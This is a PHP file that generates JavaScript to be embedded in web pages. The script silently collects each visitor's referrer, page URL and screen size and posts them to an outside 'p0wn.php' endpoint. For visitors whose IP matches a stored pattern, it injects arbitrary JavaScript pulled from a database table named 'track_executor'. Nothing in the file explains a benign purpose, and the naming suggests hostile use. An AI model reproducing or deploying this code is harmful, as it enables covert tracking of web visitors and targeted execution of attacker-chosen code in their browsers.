<?php
Header("content-type: application/x-javascript");
require_once('inc/functions.php');
$userID = $_GET['userID'];
$site = $_GET['site'];
if(!isset($userID) || !is_numeric($userID) || strlen($userID) > 4 || strlen($site) > 3 || !isset($site) || !is_numeric($site)) {
	//invalid request
}
else {
$ipAddress = $_SERVER['REMOTE_ADDR'];
$blockerCodeGetter = $db->prepare("SELECT * FROM track_executor WHERE userID=? AND ? LIKE blockedIP");
$blockerCodeGetter->execute(array($userID,$ipAddress));
echo "
$(document).ready( function () {
	var referrer = document.referrer;
	var currentpage = $(location).attr('href');
	var widthy = screen.width;
	var heighty = screen.height;
	var data_object = {
		'ref':		referrer,
		'currentpage':	currentpage,
		'id':	'".$userID."',
		'site': '".$site."',
		'screenw':	widthy,
		'screenh':	heighty
    };
	$.post('https://www.metalmetalland.com/tracker/p0wn.php',data_object);";
	while($row = $blockerCodeGetter->fetch()) {
		$jsToExecute = stripslashes($row['codeToRun']);
		echo "$jsToExecute";
	}
	echo "
});";
}